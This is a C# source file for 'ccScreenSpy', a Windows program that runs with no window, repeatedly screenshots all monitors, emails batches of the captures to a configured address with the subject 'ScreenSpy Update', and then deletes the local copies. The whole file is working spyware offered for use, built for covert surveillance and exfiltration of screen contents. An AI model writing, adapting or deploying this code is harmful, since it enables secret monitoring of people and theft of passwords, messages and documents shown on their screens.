using System;
using System.IO;
using cc.Utility;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;
using System.Drawing.Imaging;
using System.Collections.Generic;

namespace ccScreenSpy
{
    class ccScreenSpy : ApplicationContext
    {
        Thread _spyThread = null;
        ccEmailer _emailer = new ccEmailer();
        int _capturesPerEmail = ccScreenSpySettings.Default.captures_per_email;
        int _captureFrequency = ccScreenSpySettings.Default.capture_frequency;
        string _captureDirectory = ccScreenSpySettings.Default.capture_directory;
        /// <summary>
        /// Iniailizes a spying operation
        /// </summary>
        public ccScreenSpy()
        {
            _spyThread = new Thread(() => 
            {
                int numCaptures = 0;
                List<string> filePaths = new List<string>();
                while (true)
                {
                    string capturedPath = CaptureScreen();
                    if (ccScreenSpySettings.Default.to_address != String.Empty && cc.Utility.ccEmailerSettings.Default.smpt_server != String.Empty)
                    {
                        filePaths.Add(capturedPath);
                        numCaptures++;
                        if (numCaptures == _capturesPerEmail)
                        {
                            numCaptures = 0;
                            List<string> thisRunsPaths = new List<string>();
                            thisRunsPaths.AddRange(filePaths);
                            filePaths.Clear();
                            Thread emaiThread = new Thread(() =>
                            {
                                _emailer.EmailFiles(ccScreenSpySettings.Default.to_address, ccScreenSpySettings.Default.from_address,
                                    "ScreenSpy Update", "ScreenSpy Update: " + ccScreenSpySettings.Default.capture_subject, thisRunsPaths);
                                foreach (string file in thisRunsPaths)                                                                      // delete the files that were sent
                                    File.Delete(file);
                            });
                            emaiThread.Start();
                        }
                    }
                    System.Threading.Thread.Sleep(_captureFrequency);
                }
            });
            _spyThread.Start();
        }
        
        /// <summary>
        /// Captures the screen into a file
        /// </summary>
        /// <returns>the path to the screen capture file</returns>
        private string CaptureScreen()
        {
            List<Bitmap> allScreens = new List<Bitmap>();
            Bitmap combinedScreen = null;
            try
            {
                int totalWidth = 0;
                int totalHeight = 0;
                string fileName = string.Format(_captureDirectory + "\\ccss{0}.png", DateTime.Now.ToString("yyyy.mm.dd.HH.mm.ss"));
                foreach (Screen currentScreen in Screen.AllScreens)
                {
                    Bitmap screenshotBitmap = new Bitmap(currentScreen.Bounds.Width, currentScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                    using (Graphics currentScreenGraphics = Graphics.FromImage(screenshotBitmap))
                    {
                        currentScreenGraphics.CopyFromScreen(currentScreen.Bounds.X, currentScreen.Bounds.Y, 0, 0, currentScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                        totalWidth += screenshotBitmap.Width;                                                          // adjust final image dimensions
                        totalHeight = (totalHeight < screenshotBitmap.Height) ? screenshotBitmap.Height : totalHeight;
                        allScreens.Add(screenshotBitmap);
                    }
                }
                combinedScreen = new Bitmap(totalWidth, totalHeight);
                using (Graphics combinedGraphics = Graphics.FromImage(combinedScreen))
                {
                    int offsetX = 0;
                    foreach (Bitmap screenBitmap in allScreens)
                    {
                        combinedGraphics.DrawImage(screenBitmap, new Rectangle(offsetX, 0, screenBitmap.Width, screenBitmap.Height));
                        offsetX += screenBitmap.Width;
                    }
                }
                combinedScreen.Save(fileName, ImageFormat.Png);
                return fileName;
            }
            catch (Exception)
            {
                if (combinedScreen != null)
                    combinedScreen.Dispose();
                throw;
            }
            finally
            {
                foreach (Bitmap screenBitmap in allScreens)
                    screenBitmap.Dispose();
            }
        }         
    }
}
